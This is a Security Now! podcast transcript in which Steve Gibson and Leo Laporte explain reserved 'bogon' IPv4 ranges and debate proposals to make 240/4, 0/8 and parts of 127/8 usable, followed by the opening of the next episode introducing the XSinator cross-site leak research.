STEVE:  They called themselves "the survivors."  And I said, "Look around."  I said, "I know you guys all think I haven't been paying attention to what's going on here, that I've been busy coding."  I said, "And you probably haven't stopped to think about this.  But look around at who's not here listening to this now, and ask yourself if I made a single mistake." 



LEO:  Oh, wow, yeah.



STEVE:  And they hadn't thought about that.  They were too concerned about themselves.



LEO:  Understandably, yeah.



STEVE:  Yeah, of course.  And they started thinking, oh, he's gone, and she's gone, and that nightmare gossip is no longer with us, and so forth.  And they understood.  And that was the last time that happened.  Attrition just...



LEO:  The rest was attrition, yeah.



STEVE:  Yeah, the rest was attrition.  And then the Internet happened, and I didn't need them because I need Greg to talk to customers and Sue to do the books and keep the money.  



LEO:  You still had people designing box covers and writing manuals and all that stuff.  You don't need that anymore.



STEVE:  Yeah.  So Kevin Mix, my final tweet.  He said:  "Hello, Steve.  As I listened to SN-846" - of course that was last week - "I had to pause and pull up the IETF draft for the 127/8 unicast proposal.  As a frequent reader of RFCs for my day job as a network engineer, I often find myself checking the author's section at the bottom to try to glean some insight into their motivations by seeing which companies or organizations they're associated with.  In the draft proposal you referenced" - and he  has the link - "all of the authors reference the 'IPv4 Unicast Extensions Project.'  Google led me to this GitHub page."  And I have a link in the show notes, and he provided it.  "So it looks like this is a longer term effort these gentlemen are working toward.



"Professionally speaking, I would not want to be assigned an address out of this pool if it were released to the RIRs for unicast use" - that's the Regional Internet Registries - he says, "as I imagine there would be some hosts or even entire ISPs that would never implement this standard, ensuring that any services hosted on those IPs would have flakey connectivity, at best.  One whopper of an understatement in the 'Compatibility and Interoperability' section of the draft gave me a bit of a chuckle."  And he said, he then quoted it:  "Since deployed implementations' willingness to accept 127/8 addresses as a valid unicast address varies, a host to which an address from this range has been assigned may also have a varying ability to communicate with other hosts."



So an understatement indeed.  Which leads us into today's discussion of the broader goals of the IPv4 Cleanup Project.



LEO:  Let's go bonkers about bogons.



STEVE:  Bonkers about bogons.  Okay.  And bogons is a real thing.  I appreciate that you did not put it into the Google machine.  Had you done so, you'd have found out what they were.



LEO:  No spoilers, no.



STEVE:  Before we begin, since we're necessarily going to be talking about network addressing, I want to make sure everyone's on the same page about the nomenclature for describing IPv4 networks.



Okay.  One of the many brilliant innovations made by the designers of the Internet's routing architecture was this idea of dividing the 32 bits of IPv4 address space into a network number, and the number of a specific machine within that network.  So when, for example, we talk about the 10-dot network, we mean any IP whose first, leftmost 8 bits, or also called an "octet," of network address is 10.  And that means that all the machines within that network, their IPs begin with 10, and then the other 24 bits differ.  The clearer and more formal way of describing it is to say 10/8, where the 8 refers to the number of bits, counting from the left, which will be used to designate the network number, and the rest of the bits to the right will be used to designate a specific machine within that network.



So last week I prefaced our discussion of the IETF's stated intention to redefine the entire currently unroutable 127/8 network into two pieces, to cut it in half.  We'd have 127.0/16, which would remain unroutable and be used as a localnet which contains the default localhost IP of 127.0.0.1 plus 65,535 other 127.0 IPs.  Then the rest of the 127/8, which would run from 127.1/16 through 127.255/16, would be newly made available to the IANA and the regional Internet registries as blocks of newly routable IPv4 addresses.  And the feeling is that's a useful amount.  That's more than 16 million addresses.



Okay.  But it turns out that this IETF draft proposal is only the tip of the iceberg.  And since our discussion of this bit of an iceberg drew so much interest and response last week, it was kind of overwhelming, I decided that while we were on the topic, I ought to share the rest since there's more.  So we need to talk about bogons.  By definition, "bogons" are IP packets having unroutable source or destination IPs which should therefore never appear on the public Internet.



We have a formal and fun definition of bogons over on Wikipedia, which explains:  "The term 'bogon' stems from hacker jargon, with the earliest appearance in the Jargon File in version 1.5.0 dated 1983.  It's defined as the quantum of bogosity, or the property of being bogus."



LEO:  Yeah, yeah, that makes sense.



STEVE:  Yeah.  "A bogon packet is frequently bogus both in the conventional sense of being forged for illegitimate purposes, and in the hackish sense," writes Wikipedia, "of being incorrect, absurd, and useless."  You know, it can't be on the public Internet.  "These unused IP addresses are collectively known as a bogon, a contraction of 'bogus logon', or a logon from a place you know no one can actually log on from."



LEO:  That makes sense.



STEVE:  So a bogon.



LEO:  A bogus logon.  



STEVE:  Yeah, a bogus logon, a bogon.  And just for the record, despite the similarity in sound, bogons should never be confused with Vogons, Leo.



LEO:  Very important.



STEVE:  Vogons are, of course, the distasteful alien race created by Douglas Adams for his "Hitchhiker's Guide to the Galaxy."  As we learned in his first novel, Vogons take on very large construction projects and specialize in demolition.  And as you reminded us at the beginning of the podcast, they're also very, very bad poets.



Okay.  Oh, and just for the record, I was thinking about this, and dare I say in the shower, they are also - these bogons should also not be confused with Bunnons.



LEO:  What's that?



STEVE:  Bunnons were the aliens in the Star Trek movie that my junior high best friend and I and our group created on Super 8mm.



LEO:  Not widely seen, but okay.



STEVE:  No.  His sister, Scott's sister, had a huge collection of stuffed bunny rabbits.  And so of course we used stop-frame animation to bring the bunny rabbits to life.  So of course they were the Bunnons were the aliens.



LEO:  Sure.  Absolutely.



STEVE:  And our long-time listeners will remember that at one point in this, because there was an audio track, we needed the very threatening Bunnons to address the Captain of the Enterprise, saying, "We are the Bunnons.  Surrender your ship or be destroyed."  And so I came up with the idea of recording that on a reel-to-reel tape deck and then reversing the tape so that it would play backwards.  And if you play that backwards, you get sna-na ba-na-ni, yo-sha ba-di-dro, pa-shor-yor-nar-ros.  So we then recorded yo-sha ba-di-dro, sna-na ba-na-ni, pa-shor-yor-nar-ros.  And we reversed that in order to get a very wonderfully alien-sounding "We are the Bunnons.  Surrender your ship or be destroyed."



LEO:  Oh, that's clever.  Very clever.



STEVE:  It worked.



LEO:  Yeah.



STEVE:  It worked.  So yes, we were clever little pre-hackers.



LEO:  What grade was this?



STEVE:  This was eighth grade, before high school.



LEO:  Wow, that's cute, that's really cute. 



STEVE:  Well, and of course we had to have a battle between the - I'm sure we had a Klingon battle cruiser and the Enterprise.  So Scott put up some black construction paper which he poked a whole bunch of little tiny holes into and then backlit it with spotlights so that we had stars.  And the two ships were hung from black thread.  And every so often he would like move one, and it would like shake, and then the other one would shake, and then the first one would shake.  And then so that was what was recorded on this 8mm film.  Then we took a pin and carefully scratched the emulsion on the back in order to create phaser strikes from one ship to the other in order to add our special effects.  So, yeah, it was quite a project.



LEO:  What fun.



STEVE:  We always wondered what happened to it.  We sort of lost track of the film.  Anyway, where was I?  Last week, before introducing the localhost 127/8 network, we talked about the concept of non-routable networks by reminding everyone of the most common non-routable private networks that most of us probably have.  Remember, 192.168.0 dot something, so that would be 192.168.0/24 since all of the leftmost 24 bits are the network; and then you have one byte, the last number, to specify the machine on the network.  But Netgear and some other routers default to 192.168.1/24 for whatever reason.



And of course these are both small pieces of the larger 192.168/16 network, all of which was set aside by that original RFC 1918.  And as we know, that RFC also defined the 10/8 and the 172.16/12 groups to be similar set-aside, non-routable networks to be used to number the machines inside of private LANs.  So all of the IPs within those ranges are by definition bogons.



But there are also other longstanding set-asides.  And they, too, have come under the scrutiny of a group which has been founded and calls themselves the "IPv4 Cleanup Project."  And they're quite serious.  Before we consider what they have to say, let's take a look at these other Bogon addresses.  The original RFC 3330, which was dated September 2002, was later obsoleted by RFC 5735 in 2010 to reflect a few changes, and both RFCs were titled "Special Use IPv4 Addresses."



In the abstract of this thing it says:  "This document describes" - again, remember, originally in '02, and then updated in 2010, so still 11 years back.  "This document describes the global and other specialized IPv4 address blocks that have been assigned by the IANA, the Internet Assigned Numbers Authority.  It does not address IPv4 address space assigned to operators and users through the Regional Internet Registries, nor does it address IPv4 address space assigned directly by IANA prior to the creation of the Regional Internet Registries.  It also does not address allocations or assignments of IPv6 addresses or autonomous system numbers."



So here's how they start in describing the whole intent here.  And it's brief.  "Throughout its history," they said, "the Internet has employed a central Internet Assigned Numbers Authority (IANA) responsible for the allocation and assignment of various identifiers needed for the operation of the Internet."  That was specified in RFC 1174.  "In the case of the IPv4 address space, the IANA allocates parts of the address space to Regional Internet Registries according to their established needs.  These RIRs are responsible for the registration of IPv4 addresses to operators and users of the Internet within their regions.



"On an ongoing basis, the IANA has been designated by the IETF to make assignments in support of the Internet Standards Process."  And the Internet Standards Process was documented in RFC 2860.  "Section 4 of that document describes that assignment process.  Small portions of the IPv4 address space have been allocated or assigned directly by the IANA for global or other specialized purposes.  These allocations and assignments have been documented in a variety of RFCs and other documents.  This document is intended" - this, the one that we're talking about now, 3330 - "this document is intended to collect these scattered references and provide a current list of special use IPv4 addresses.



"This document is a revision of RFC 3330, which it obsoletes.  Its primary purpose is to reflect the changes to the list of special IPv4 assignments since the publication of RFC 3330.  It is a companion to RFC 5156, which describes special IPv6 addresses."  In other words, this document, this RFC, is the - you could call it the "Bogon Bible."



Okay.  So what are the bogon address blocks?  First one, 0/8, which is to say, you know, 0.0.0/8, any IP whose first octet is zero.  Addresses in this block, the RFC says, refer to source hosts on "this," in other words, the current network.  So it's a self-referential network.  And they said address 0.0.0.0/32, meaning exactly that IP, may be used as a source address for this host on this network.  Other addresses within the 0/8 may be used to refer to specified hosts on this network.



So that's an interesting set-aside; right?  That says that an IP whose first octet is zero is a self-reference, that is, it's kind of like a wildcard always referring to the network on which this host resides.  And 0.0.0.0, that IP is also referring to this device.  And sure enough, if you put in a route print, like under Windows, you'll see 0.0.0.0 matching exactly to the network interface of that machine.  So there is another, what is it, 24 bits.  So that's 16 million IPs tied up in the 0/8 network.



Then we have the 10-dot that we've talked about, you know, the 10/8 for local networks.  And documented in this RFC we have 127/8, that entire block set aside for loopback.  Then we have another one that's interesting.  And people who've been paying attention may have noted or may have seen this IP and thought, what the heck?  Where did that come from?  And that's 169.254/16.  That's the so-called "link local" block that's described in RFC 3927.  And it's allocated for communication between hosts on a single link.  Hosts obtain these addresses by auto-configuration, such as when a DHCP server cannot be found.



And if anyone has ever turned on a Windows machine that has its LAN adapter enabled, yet no WiFi set up and no cable plugged in, you may notice that that LAN adapter will be given an IP 169.254 dot something dot something.  That is sort of an auto-configuration.  If Windows doesn't see anything else, has no other way of getting an IP, hasn't been configured as a static IP, but it's set for obtain IP address automatically, that's what gets used, something from that block.



We also have, as we've mentioned, another one of the RFC 1918s, the 172.16/12.  And also 192/24 is a block reserved for IETF protocol assignments, 192/24.  So that's 192.0.0 where the last byte is then the machine on the network.  And the RFC says at the time of this writing this document there's no current assignments.  Allocation policy for future assignments is given - and they talk about the assignment policy.  But that is to say 192.0.0 dot anything, or in other words 192.0.0/24, well, that's not a big network; right?  That's got 256 machines maximum, never been allocated.  And if you had some clever use for it, it's probably safe to do that.



Then there's 192.0.2/24.  They define that as TEST-NET-1.  They say:  "This block is assigned as TEST-NET-1 for use in documentation and example code.  It's often used in conjunction with domain names example.com or example.net in vendor and protocol documentation."  So they're not legitimately on the Internet, and they've never been assigned.  But it's a /24; right?  So only 8 bits' worth of machine, so it's only 256 IPs.



There is 192.88.99/24, which is to say 192.88.99 dot anything.  We don't see that often.  This block is allocated for use as an IP6 to IP4 relay anycast for those relay anycast addresses which are described in RFC 3068.  And they said:  "In contrast with previously described blocks, packets destined to addresses from this block do appear in the public Internet."  And then RFC 3068, Section 7, describes operational practices.  Okay.  But again, not a big block, only 8 bits of machine.



We also have the other private LAN, 192.168/16.  We were just talking about that.  That typically is what we have on our routers, although we use it with a 0 dot something and a 1 dot something.  There is a 198.18/15.  So they say this block has been allocated for use in benchmark tests of network interconnected devices.  RFC 2544 explains that this range was assigned to minimize the chance of conflict in case a testing device were to be accidentally connected to part of the Internet.



Packets with source addresses from this range are not meant to be forwarded across the Internet.  So again, a bogon range of IPs.  Let's see, it's 15 bits, so that's going to be 32,000 IPs.  Not a tiny level, but not up at the 16 million level.  198.51.100/24, that's another block of 256 IPs designated as TEST-NET-2.  And 203.0.113/24 is TEST-NET-3.  So those are small blocks, not of particular interest, but they are reserved.



Now we come to the two biggies.  224.0.0.0, or I should say 224/4, okay, now think about that, 224/4.  That means that 28 bits, because 4 plus 28 is 32, 28 bits in the 224 network are machine names.  So that's, okay, so 24 bits is 16 million.  25 bits is 32 million.  26 bits is 64 million.  So that's 256 million IPs sitting underneath 224.  And the RFC says:  "This block, formerly known as the Class D address space, is allocated for use in IPv4 multicast address assignments.  The IANA guidelines for assignments from this space are described in RFC 3171."  So 224/4 is sitting on a huge number, 256 million IPs.



And 240 is the last one.  240/4, also a /4, formerly known as the Class E address space, is reserved for future use.  And they say the one exception to this is the "limited broadcast" destination of, and any network engineers know about 255.255.255.255.  The very last IP in the 32-bit IPv4 space is a broadcast address, meaning that all devices on the network receive things sent there.



Okay.  There's no way we can mess with the three private and the widely used RFC 1918 networks.  They're clearly safe.  169.254/16, that one is safe, too.  That's the one that is used for auto-configuration.  And as I mentioned, anybody who's ever turned on a network adapter that's attached to nothing, Windows chooses an address there.  Presumably it will emit an ARP packet asking if anybody else listening has that IP.  And if someone responds "Yeah, I do," then Windows will choose a different IP and re-issue an ARP until it finds one which nobody responds to, and then it'll settle down and use that IP.  That is kind of a cool way that a bunch of machines without any kind of a central  arbiter, no DHCP server, for example, would be able to all obtain unique IPs on a large network.  And again, that's a /16, so it's 64,000, 64K, 65,536 IPs.  



The zero net is interesting.  And it's a /8, so it's taken 16.77 million IPv4s, remember, 1/256th of the entire IPv4 space, out of service.  The three TEST-NETs are all /24s.  They're not worth bothering with.  The 198.18/15 does set aside and tie up 32K IPs, ostensibly for use in benchmark tests of network interconnected devices, as this thing says.  I've never run across it, but that one's sort of difficult to appraise.  So, aside from the zero net, this leaves us with the two monster allocations that we have not yet talked about in detail.  We did talk about reassigning most of 127.  So we have 224/4 which has been set aside for use in IPv4 multicast, and 240/4 which the RFC simply states has been reserved for future use.  Well, that's sitting on a huge allocation.



Which brings us to the IPv4 Cleanup Project.  And this is a page over on GitHub where they're organizing and running things.  Under About, they describe themselves briefly in a sentence:  "The IPv4 unicast extensions project - making class-e (240/4), 0/8, 127/8, 225/8-232/8 generally usable - adding 419 million new IPs to the world, and fixing various other slightly broken pieces of the IPv4 world."



Okay.  So NANOG is N-A-N-O-G, the North American Network Operators Group.  And their NANOG listserv is pretty much where most of the Internet evolves.  Thursday before last, on November 18th, a well-known guy by the name of John Gilmore responded at some length to a NANOG posting.  John, one of the people in the IPv4 Cleanup Project, is one of the founders of the EFF, the Electronic Frontier Foundation.



LEO:  And was also, just a few weeks ago, kicked off the board there for reasons we do not know.



STEVE:  Oh, that's right, we talked about that, right.



LEO:  Yeah.



STEVE:  He created the Cypherpunks mailing list and co-founded Cygnus Solutions.  He also created somehow the alt.* hierarchy in Usenet.  And, boy, what a sewer that place was.



LEO:  Thank you, John.



STEVE:  Back in the day.  Oh.



LEO:  He's kind of a libertarian, I think.  I get the feeling, you know.



STEVE:  Yes.  He describes himself as a civil libertarian.  And remember, Leo, you'll remember this, he once famously quipped that:  "The Internet interprets censorship as damage and routes around it."



LEO:  Mm-hmm.



STEVE:  Uh-huh.  So I guess he's something of an idealist, as well.  Anyway, Steven Bakker (B-A-K-K-E-R), a network engineer of some repute himself, posted, to which John responded.  Steven posted:  "The ask is to update every IP stack in the world, including validation, equipment retirement, reconfiguration, et cetera."  And John took this in good spirit and appeared unruffled.  He makes a number of valid points while presenting and stating a well-thought-out case for hugely reducing the Internet's current bogon bloat.  So I felt it was worth hearing John out.  The purpose of the preamble was to create a foundation and context for understanding John's reply.



Here's what he wrote.  He said in response to Steven Bakker's "The ask is to update every stack in the world," he says:  "This raises a great question.  Is it even doable?  What's the risk?  What will it cost to upgrade every node on the Internet?  And how long might it take?"



He said:  "We succeeded in upgrading every end-node in every router in the Internet in the late '90s and early 2000s when we deployed CIDR."  Meaning that networks would no longer be strictly Class A, Class B, Class C, meaning /8s, /16s, and /24s, but rather that boundary could be variable.  He said:  "It was doable."  Of course let's also remember that was back in the late 1990s when a lot was doable that you could argue, you know, we didn't all have little IP stacks in all of our plugs and light bulbs and widgets around our homes back then.  He said:  "It was doable.  We know that because we did it.  And if we hadn't done it, the Internet would not have scaled to world scale."  And that's certainly the case, that you couldn't arbitrarily divide address spaces down if you had to allocate in huge chunks.



He said:  "So today, if we decide that unicast use of the 268 million addresses in 240/4 is worth doing, we can upgrade every node."  Maybe.  But that's what he said.  He said:  "If we do, we might as well support unicast on the other 16 million addresses in 0/8, and the 16 million in 127/8, and the other about 16 million reserved for 4.2 BSD's pre-standardized subnet broadcast address that nobody has used since 1985.  And take a hard look at another hundred million addresses in the vast empty multicast space that have never been assigned by IANA for anybody or anything.  Adding the address blocks around the edges makes sense.  You only have to upgrade everything once, but the 268 million addresses becomes closer to 400 million formerly wasted addresses.  That would be worth half again as much to end users, compared to just doing 240/4."



So the point he's making there is there is a lot of bogon bloat.  And if we're going to make a change, let's make a comprehensive change.  He says:  "It may not be worth it to you, or to your friends.  But it would be useful to a lot of people, hundreds of millions of people who you may not even know.  People who didn't get IP addresses when they were free; people outside the U.S. and Europe who will be able to buy and use them in five or 10 years, rather than leaving them unused and rotting on the vine forever.



"We already know that making these one-time patches is almost risk-free.  240/4 unicast support is in billions of nodes already, without trouble.  Linux, Android, macOS, iOS, and Solaris all started supporting unicast use of 240/4 in 2008.  Most people, even most people in NANOG, didn't even notice.  0/8 unicast has been in Linux and Android kernels for multiple years, again with no problems.  Unicast use of the lowest address in each subnet is now in Linux and NetBSD recently.  See the drafts for specifics."



He says:  "If anyone knows of security issues that we haven't addressed in the drafts, please tell us the details."  He said:  "There's been some arm-waving about the need to update firewalls, but most of these addresses have been usable as unicast on LANs and private networks for more than a decade, and nobody's reported any firewall vulnerabilities to CERT.



"Given the low risk, the natural way for these unicast extensions to roll out is to simply include them in new releases of the various operating systems and router OSes that implement the Internet protocols.  It's already happening.  We're just asking that the process be adopted universally, which is why we wrote Internet-Drafts for IETF.  Microsoft Windows is the biggest laggard.  They drop any packet whose destination or source address is in 240/4.  When standards said 240/4 was reserved for what might become future arcane, for example, variable-length, anycast, 6to4, et cetera, addressing modes, that made sense.  It doesn't make sense in 2021.  IPv4 is stable and won't be inventing any new addressing modes.  The future is here, and all it wants out of 240/4 is more unicast addresses.



"By following the normal OS upgrade path, the cost of upgrading is almost zero.  People naturally upgrade their OSes every few years.  They replace their server or laptop with a more capable one that has the latest OS.  Laggards might take five or 10 years.  Peoples' home WiFi routers break, or are upgraded to faster models, or they change ISPs and throw the old one out every three to five years.  A huge proportion of end-users get automatic over-the-net upgrades via an infrastructure that had not yet been built for consumers during the CIDR transition.  Patch Tuesday could put some or all of these extensions into billions of systems at scale, for a one-time fixed engineering and testing cost.



"We've tested major routers, and none so far require software updates to enable most of these addresses, except on the lowest address per subnet.  At worst, the ISP would have to turn off or reconfigure a bogon filter with a config setting.  Also, many 'Martian addresses'" - those are also bogons - "bogon lists are centrally maintained and can easily be updated.  We have found no ASIC IP implementations that hardwire in assumptions about specific IP address ranges.  If you know of any, please let us know; otherwise, let's let that straw man rest.



"Our drafts don't propose to choose between public and private use of the newly usable unicast addresses, so the prior subject line that said 'unicast public' was incorrect," he said.  "Since the kernel and router implementation is the same in either case, we're trying to get those fixed first."  He says:  "There will be plenty of years and plenty of forums - NANOG, IETF, ICANN, IANA, and the RIRs - in which to wrestle the public-versus-private questions to the ground and make community decisions on actual allocations.  But if we don't fix the kernels and routers first, none of those decisions would be implementable.



"Finally, as suggested by David Conrad, there is a well understood process for 'de-bogonizing' an address range on the global Internet, once support for it exists in OSes.  Cloudflare used it on 1.1.1.1; RIPE used it on 128/16 and on 2a10::/12," an IPv6.  "You introduce a global BGP route for some part of the range, stand up a server on it, and use various distributed measurement test beds to see who can reach that server.  When chunks of the Internet can't, an engineer figures out where the blockage is and communicates with that ISP or vendor to resolve the issue.  Lather, rinse, and repeat for a year or more until reachability is 'high enough.'



"Addresses that later end up allocated to private address blocks would never need 100% global reachability, but global testing would still help to locate low-volume OS implementations that might need to be updated.  Addresses purchased to number retail cell phones need not be as reachable as ones listed on public-facing servers, et cetera.  The beauty of a market for IP addresses, rather than one-size-fits-all allocation models, is that ones with different reachability can sell for different prices, at different times, into different niches where they can be put to use."  Signed, John.



And I like his argument.  The gist of it is that we have nothing to lose by immediately changing some of today's long-established IPv4 standards.  Essentially they're just set-asides.  IPv4 has clearly outgrown its original design, which deliberately incorporated a lot of waste that once seemed insignificant.  That's the only reason you'd give a university or a project a /8.  It's like, here you go.  Have some IPs.  But that waste is not insignificant today.  IP stack vendors will be formally notified that the IETF is changing a bunch of definitions which affect a handful of mostly unused IPv4 space.  All that's needed are some tweaks to their OS's default routing table.



Engineers simply need clear guidance and specification to do whatever they need to.  Last week we noted that F5 Networks BIG-IP systems were currently using some of the space under 127 that's now slated to become routable.  But the entire 127.0/16 network remains local and non-routable.  So all F5, for example, needs to do is migrate those arbitrarily scattered blocks they're currently using, which are outside the lower 64K IPs, down into that range.  Once that's done, they'll know that if the routability of 127/8 should ever change, they'll already be compatible.  And there's no reason for them not to change that today since it will be completely compatible with our current system.



The other thing I appreciate about John's post is his sense of time.  Everyone is always in a hurry, and 10 years sounds like forever.  But it'll be here before we know it.  And when we get there, it would be nice to find that 419 million more IPv4 addresses have been widely usable for some time.  I think the point is it's entirely possible that it might never happen.  But it can never happen if we never make it possible.  And making it possible is not difficult or expensive.



So a different look at the same issue.  And I think it's one that makes sense.  Microsoft will change their routing table.  Linux, Mac, iOS, a whole bunch of other OSes largely already have.  And once this is tested and is widespread enough, those new blocks of IPs can be made available.  So anyway, bogons begone.  I think really it just says that we were giving them away like crazy and setting them aside.  And just there's been no need to set them aside for quite a long time.



LEO:  So you amend what you said last week about this being a potential disaster?  You think you agree with his point of view that doing this, I mean, isn't it going to be painful for 10 years?



STEVE:  So last week I wasn't thinking of it, obviously, the way he is.  Last week I was imagining that in a year, for example, or six months, like the IETF was going to make the declaration and say everybody needs to change, and we're going to start handing out those 127.* IPs in 2022, or 2023.



LEO:  But if we wait 10 years...



STEVE:  Right.



LEO:  There'll be a minimum amount of pain because by then we'll all be used to the idea.



STEVE:  Correct.



LEO:  We'll have fixed all the systems that might be...



STEVE:  Well, yeah.  I mean, so the natural turnover in equipment will have rendered these things accessible.  And the other point he made is it's different to be a server on an IP than to be, for example, a cell phone on an IP.  The server, because it's offering services to the entire Internet, needs to be reachable by the entire Internet.  An IP that an ISP has given to a cell phone, it needs to be reachable to the IP.  So it's a different bar of accessibility.  And so the point is, he says, you don't - it's like, yes, certainly the 240/4 IPs, there's no reason not to use them except Windows needs to get changed because right now it's stomping on that entire network in its routing table.  If you do a route print in Windows, you'll see 240.0.0.0 is like it's got four entries.  It just won't go anywhere.  But none of the other OSes do.  And we know that Microsoft could change that in two weeks, in December's Patch Tuesday.



So I guess I can see his point.  If you're not in a hurry, then it makes sense to lift the barrier, make it official, and see what happens.  But if you don't do that today, it will never happen.  And we will then forever be wasting 400 and however many it was IPv4s that could be useful to some people.  And as he says, it's easy to say, oh, go use IPv6.  But obviously a lot of people don't want to for whatever reason.  So anyway, I wanted to show and share the flipside of this, which is that, okay, maybe it looks like something worth doing.  Again, no one's being forced to do it.  But if we don't allow it to happen, it can never happen.



LEO:  Okay.  I like it.  So there.  We've just changed the timeline.  That's really - we're looking at a larger scale.



STEVE:  We've said, okay, it's not practical to do it tomorrow.



LEO:  Obviously.



STEVE:  Maybe it will happen by itself in 10 years.



LEO:  Right.  Although somebody pointed out at the rate we're going to IPv6, we should be there in about 500 years.  Maybe we should wait till then.



STEVE:  Yeah.  Exactly.



LEO:  Okay.  This is what I love about this show.  I mean, I don't, ladies and gentlemen, I don't think there's any other show in the world that you would hear this discussion and hear it explained, I think so clearly.  And by the way, kudos to Steve for looking further into this after talking about it last week.  I love it.  There's a real benefit to this show.  Thank you for doing it.  I appreciate it, Steve.  I hope more people listen to it. 



There's a couple ways you can consume it.  You can of course watch us do it live.  I think a lot of people do.  I hope you would still download it because we don't really count the live views.  But if you want to watch us do it live, kind of like behind the scenes, go to live.twit.tv of a Tuesday afternoon, right after MacBreak Weekly.  It's probably around 1:30 p.m. to 2:00 p.m. Pacific.  That'd be about 4:30 p.m. Eastern time.  That would be 21:30 UTC.  You could watch us do it live, chat with us live at irc.twit.tv or in the Club TWiT Discord.  Then of course after the fact you can get it from Steve.  Steve's got copies at his site, GRC.com, the edited versions, and some unique formats, too, the 16Kb version.  He commissions Elaine Farris to write transcripts, and that takes about five days, a week for her to do?



STEVE:  She really does hurry them out.  So normally Thursday afternoon is our typical turnaround.



LEO:  Check those out, plus 64Kb audio.  That's at GRC.com, Steve's website, the Gibson Research Corporation, now pared down to a mere three people.  But they've been there for decades.  That's really awesome.  That's really awesome.  It is three people; right?  I mean, basically.



STEVE:  It is three people.  Three people, yeah.



LEO:  That's awesome.  For 30 years you got the right three people, 30-plus.  You can also find, while you're there, so many great free things, information about SQRL, his I think brilliant login system that, I don't know, I don't know if anybody's going to adopt it.  Well, some of us, we have.  But I don't know if the world's going to adopt it, but it's there if you need it.



You can also get the one thing that makes Steve money, which is SpinRite, his bread and butter, the world's best mass storage maintenance and recovery utility.  You can get it right now.  6.0's the current version.  But if you buy 6.0 now, you'll get a free upgrade to 6.1, and you get to participate in the development of it, which has been ongoing, but I think we're seeing the light at the end of the tunnel.



STEVE:  Yeah.  I'm very excited.



LEO:  No promises.  But soon.  There's also, just like I said, a bunch of free stuff there, including a chance, if you want to leave him feedback, leave him feedback there at GRC.com/feedback. Probably better to DM him on Twitter.  Those are open.  His Twitter handle:  @SGgrc.  Steve is of course also very kindly letting us put it on our website, TWiT.tv/sn.  You can get audio and video there.



There's a YouTube channel.  You can watch the show there.  I think it's YouTube.com/securitynowshow.  Maybe.  Anyway, you know, if you go to YouTube.com/twit, that links to all the shows.  Individual show channels are there.  Easiest way to get it may be subscribe in a podcast client.  That way you'll get it automatically every week.  Even if you watch it live, do that please for us because we do count those downloads, and that helps us.



All you have to do is find a podcast client you like, Pocket Casts, Overcast, Apple Podcasts, Google's Casts, there's tons of them, and subscribe.  And if your client allows reviews, please, you heard this show, you know how good this is.  Give it a five-star review.  Let other people find it.  Help them find it because everybody ought to be listening to Security Now!, now in its 18th year.  I don't know how many years it is.  17?



STEVE:  We're in 17, yeah.  We're in year 17.



LEO:  Feels like it.  Yeah.  We're a teen, soon to be an adult, yeah.  We're going to be an adult.  So thank you, Steve.  Have a wonderful week.  "Wheel of Time," good show on Amazon Prime, by the way.



STEVE:  Ah, heard you talking about it.  You said that the first couple episodes were not quite there, but you really liked what they've done.



LEO:  It's often the case, especially for a big saga, the first few episodes, takes a little while to get into it.  But Episode 4, which they just aired on Friday, was amazing.



STEVE:  Ah, cool.



LEO:  Even if you haven't read the book, I think it's very good.  So I love the books.  People grew up reading the "Wheel of Time" series, love the books.  I don't think they'll be disappointed by the show.  And a lot of people who haven't read the books think the show's good.  It's on Amazon Prime, "Wheel of Time."  Thank you, Steve. 



STEVE:  Okay, buddy.



LEO:  On with the debogonization.  See you in December.



STEVE:  See you in December.  Bye.



Copyright (c) 2021 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#848

DATE:		December 7, 2021

TITLE:		XSinator 

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-848.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week Tavis Ormandy finds a bug in Mozilla's NSS signature verification.  We look at the horrifying lack of security in smartwatches for children (smartwatches for children?!?), and at the next six VPN services to be banned in Russia.  Microsoft softens the glue between Windows 11 and Edge, bad guys find a new way of slipping malware into our machines, a botnet uses the bitcoin blockchain for backup communications, and HP has 150 printer models in dire need of firmware updates.  We touch on sci-fi and SpinRite, then we look at new research into an entirely new class of cross-site privacy breaches affecting every web browser  including a test every user can run for themselves on their various browsers.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  We're going to talk sci-fi recommendations, smartwatches for children that are really super smart spies on your kids' wrists, bugs in Mozilla's signature verification, and a whole lot more.  Then a new tool which has revealed a flaw in pretty much every browser on the market, XSinator.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 848, recorded December 7th, 2021:  XSinator.



It's time for Security Now!, the show you wait all week for.  Here they are, the Security Now! guys.  And Steve Gibson, welcome.  It's good to see you, the guy, the man in charge of Security Now!.



STEVE GIBSON:  Leo, great to be with you as we plow into December. 



LEO:  Plow.  Plow, I tell you.	



STEVE:  Plow.



LEO:  Yes.



STEVE:  Yes.  This is the first Tuesday of the month since the month began on Wednesday, last Wednesday.  So this is, as I mentioned before, the latest in the month that we can have Patch Tuesday.  That'll be next Tuesday.  So we'll wait and see what happens.  The hope is that we're going to get printing back for Windows.



LEO:  We've been hoping that for a while, haven't we.	



STEVE:  It'd be a real Christmas present, yes.



LEO:  Yeah.  Oh, man.



STEVE:  Yes, Virginia...



LEO:  Someday.



STEVE:  ...you can print.



LEO:  Yes.



STEVE:  So a group of five German researchers took a look, a new look, a different kind of look, at a means by which a site we're visiting can work behind our backs using deliberately created features of JavaScript and the state of the art of web pages, the so-called Document Object Model, to infer privacy-violating things about us and our relationships to other websites.  So today's topic is the site they created, XSinator - XS as in cross-site, X-S-I-N-A-T-O-R.  And anybody who wants to jump ahead can go to XSinator, XSinator.com, and click the Test My Browser button.  And within a minute or so you will see a whole bunch of red which are specific instances.  This thing runs, I think it's 37 or 38.  They start numbering at zero, bless their hearts.  So I don't remember whether it's 37 or 35 and you add one for the zero-based counting.  But you'll see all of the places where their test has verified that the browser you're using can fall to some of these tests.  We're going to talk about that in some detail at the end.



But Tavis Ormandy has been busy.  He found a bug, a bad bug in Mozilla's NSS, that's their own, I assume it stands for Netscape Privacy or Netscape Security Suite because it's always been part of the Firefox and then they split it out, a very nice and actually widely used open source security library.  He found a problem, a bad problem, in their signature verification.



